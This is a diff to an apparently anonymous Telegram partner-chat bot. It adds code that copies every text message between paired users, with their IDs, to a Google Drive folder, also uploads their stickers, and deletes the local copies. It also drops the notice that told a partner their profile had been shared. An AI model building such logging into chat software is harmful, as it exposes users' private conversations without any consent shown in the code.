@@ -426,15 +426,36 @@ def handle_message(update: Update, context: CallbackContext):
 
         try:
             if update.message.text:
+                # Simpan ke file lokal
                 message_data = f"{timestamp} - {user_id} to {partner_id}: {update.message.text}\n"
                 with open(log_file_path, 'a') as log_file:
                     log_file.write(message_data)
                 context.bot.send_message(chat_id=partner_id, text=update.message.text)
                 upload_log_to_google_drive(log_file_path, '1OQpqIlKPYWSvOTaXqQIOmMW3g1N0sQzf')
+               # Hapus file log lokal setelah diunggah
+                if os.path.exists(log_file_path):
+                    os.remove(log_file_path)
               
             elif update.message.sticker:
                 sticker_id = update.message.sticker.file_id
                 context.bot.send_sticker(chat_id=partner_id, sticker=sticker_id)
+
+                # Menentukan lokasi lokal unduhan lokal
+                sticker_file_path = f'/tmp/{sticker_id}.png'
+                # Unduh file sticker dari Telegram
+                file_info = context.bot.get_sticker_file(sticker_id)
+                file_path = file_info.file_path
+                sticker_url = f'https://api.telegram.org/file/bot{context.bot.token}/{file_path}'
+                response = requests.get(sticker_url)
+                
+                with open(sticker_file_path, 'wb') as sticker_file:
+                    sticker_file.write(response.content)
+                  # Unggah file sticker ke Google Drive
+                upload_log_to_google_drive(sticker_file_path, '1KbEpuvg0rKDJSD76oPDi_RFecEcPxFE6')
+
+                # Hapus file sticker lokal setelah diunggah
+                if os.path.exists(sticker_file_path):
+                    os.remove(sticker_file_path)
 
         except Exception as e:
             logging.error(f"Error handling message: {e}")
@@ -564,6 +585,7 @@ def get_user_info(user_id: str):
     else:
         return None, None
 
+
 def user_info(update: Update, context: CallbackContext):
     user_id = update.message.from_user.id
     username, photo_id = get_user_info(str(user_id))
@@ -572,15 +594,13 @@ def user_info(update: Update, context: CallbackContext):
 
     profile_photos = context.bot.get_user_profile_photos(user_id)
     if profile_photos.total_count > 0:
-        photo_id = profile_photos.photos[0][-1].file_id
-        photo_url = generate_telegram_url(photo_id, context)
-        response_text += f"Foto Profil: [Lihat Foto]({photo_url})"
+        photo_file_id = profile_photos.photos[0][-1].file_id
+        context.bot.send_photo(chat_id=user_id, photo=photo_file_id)
     else:
         response_text += "Foto Profil: Tidak tersedia."
-
-    context.bot.send_message(chat_id=user_id,
-                             text=response_text,
-                             parse_mode='Markdown')
+        context.bot.send_message(chat_id=user_id,
+                                 text=response_text,
+                                 parse_mode='Markdown')
 
 def partner_info(update: Update, context: CallbackContext):
     user_id = update.message.from_user.id
@@ -610,7 +630,7 @@ def partner_info(update: Update, context: CallbackContext):
     partner_username = partner_data.get('username', 'Tidak ada username')
     partner_photo_id = partner_data.get('photo', None)
 
-    response_text = f"Partner Info:\nUser ID: {partner_id}\nUsername: {partner_username}\n"
+    response_text = f"User ID: {partner_id}\nUsername: {partner_username}\n"
 
     profile_photos = context.bot.get_user_profile_photos(partner_id)
     if profile_photos.total_count > 0:
@@ -621,15 +641,6 @@ def partner_info(update: Update, context: CallbackContext):
         context.bot.send_message(chat_id=user_id,
                                  text=response_text,
                                  parse_mode='Markdown')
-
-    # Send the same information to the partner
-    context.bot.send_message(chat_id=partner_id,
-                             text=f"Informasi dari pasangan Anda:\n{response_text}",
-                             parse_mode='Markdown')
-
-    if profile_photos.total_count > 0:
-        context.bot.send_photo(chat_id=partner_id, photo=photo_file_id)
-
 
 
 
